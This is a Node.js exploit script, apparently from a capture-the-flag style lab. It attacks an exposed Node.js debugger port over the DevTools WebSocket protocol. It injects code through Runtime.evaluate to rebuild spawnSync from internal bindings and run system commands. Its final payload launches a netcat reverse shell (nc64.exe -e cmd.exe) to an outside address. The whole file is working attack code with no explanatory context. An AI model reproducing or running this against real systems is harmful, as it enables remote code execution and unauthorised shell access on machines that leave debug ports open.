const fetch = require('node-fetch')
const nodeCmd = require('node-cmd');
const WebSocket = require('ws')

function die (reason) {
  console.error(reason)
  process.exit(-1)
}

if (process.argv.length !== 5) {
  die('usage: node index.js <IP> <PORT> <COMMAND>')
}

const IP = process.argv[2]
const PORT = process.argv[3]
const COMMAND = process.argv[4]
const COMMAND_B64 = base64(COMMAND)

function base64 (data) {
  return Buffer.from(data).toString('base64')
}

async function getWsLink () {
  const res = await fetch(`http://${IP}:${PORT}/json`)
  const data = await res.json()
  return data[0].webSocketDebuggerUrl
}

async function main () {
  console.log(`[?] Getting webSocketDebuggerUrl from http://${IP}:${PORT}/json`)
  const wsLink = await getWsLink().catch(die)
  console.log(`[!] Found webSocketDebuggerUrl: ${wsLink}`)
  const socket = new WebSocket(wsLink)

  socket.onopen = async (event) => {
    console.log(`[?] Connection established to ${wsLink}`)
    socket.send(JSON.stringify({ id: 1, method: 'Runtime.enable' }))
    socket.send(JSON.stringify({
      id: 1,
      method: 'Runtime.evaluate',
      params: {
        expression: `spawn_sync = process.binding('spawn_sync'); normalizeSpawnArguments = function(c,b,a){if(Array.isArray(b)?b=b.slice(0):(a=b,b=[]),a===undefined&&(a={}),a=Object.assign({},a),a.shell){const g=[c].concat(b).join(' ');typeof a.shell==='string'?c=a.shell:c='cmd.exe',b=['/c',g];}typeof a.argv0==='string'?b.unshift(a.argv0):b.unshift(c);var d=a.env||process.env;var e=[];for(var f in d)e.push(f+'='+d[f]);return{file:c,args:b,options:a,envPairs:e};}`
      }
    }))

    // socket.send(JSON.stringify({
    //   id: 2,
    //   method: 'Runtime.evaluate',
    //   params: {
    //     expression: `spawnSync = function(){var d=normalizeSpawnArguments.apply(null,arguments);var a=d.options;var c;if(a.file=d.file,a.args=d.args,a.envPairs=d.envPairs,a.stdio=[{type:'pipe',readable:!0,writable:!1},{type:'pipe',readable:!1,writable:!0},{type:'pipe',readable:!1,writable:!0}],a.input){var g=a.stdio[0]=util._extend({},a.stdio[0]);g.input=a.input;}for(c=0;c<a.stdio.length;c++){var e=a.stdio[c]&&a.stdio[c].input;if(e!=null){var f=a.stdio[c]=util._extend({},a.stdio[c]);isUint8Array(e)?f.input=e:f.input=Buffer.from(e,a.encoding);}}console.log(a);var b=spawn_sync.spawn(a);if(b.output&&a.encoding&&a.encoding!=='buffer')for(c=0;c<b.output.length;c++){if(!b.output[c])continue;b.output[c]=b.output[c].toString(a.encoding);}return b.stdout=b.output&&b.output[1],b.stderr=b.output&&b.output[2],b.error&&(b.error= b.error + 'spawnSync '+d.file,b.error.path=d.file,b.error.spawnargs=d.args.slice(1)),b;}`
    //   }
    // }))

    socket.send(JSON.stringify({
      id: 2,
      method: 'Runtime.evaluate',
      params: {
        expression: `spawnSync = function(){var d=normalizeSpawnArguments.apply(null,arguments);var a=d.options;var c;if(a.file=d.file,a.args=d.args,a.envPairs=d.envPairs,a.stdio=[{type:'pipe',readable:!0,writable:!1},{type:'pipe',readable:!1,writable:!0},{type:'pipe',readable:!1,writable:!0}],a.input){var g=a.stdio[0]=util._extend({},a.stdio[0]);g.input=a.input;}for(c=0;c<a.stdio.length;c++){var e=a.stdio[c]&&a.stdio[c].input;if(e!=null){var f=a.stdio[c]=util._extend({},a.stdio[c]);isUint8Array(e)?f.input=e:f.input=Buffer.from(e,a.encoding);}}console.log(a);var b=spawn_sync.spawn(a);if(b.output&&a.encoding&&a.encoding!=='buffer')for(c=0;c<b.output.length;c++){if(!b.output[c])continue;b.output[c]=b.output[c].toString(a.encoding);}return b.stdout=b.output&&b.output[1],b.stderr=b.output&&b.output[2],b.error&&(b.error= b.error + 'spawnSync '+d.file,b.error.path=d.file,b.error.spawnargs=d.args.slice(1)),b;}`
      }
    }))

    console.log(`[!] Executing: ${COMMAND}`)
    socket.send(JSON.stringify({
      id: 3,
      method: 'Runtime.evaluate',
      params: {
        expression: `spawnSync('cmd.exe', ['/c', 'C:\\\\\\\\windows\\system32\\spool\\drivers\\color\\nc64.exe -e cmd.exe 10.10.14.42 8888'])`
		// expression: `spawnSync('cmd.exe', ['/c', 'ping 10.10.14.42'])`
      }
    }))

    socket.close()
  }

  socket.onmessage = (event) => {
    // console.log(event)
  }

  socket.onclose = (event) => {
    // console.log(event)
    if (event.wasClean) {
      console.log('[?] Connection closed cleanly')
    } else {
      console.log('[?] Connection died')
    }
  }

  socket.onerror = (error) => {
    console.log(error)
  }
}

main()
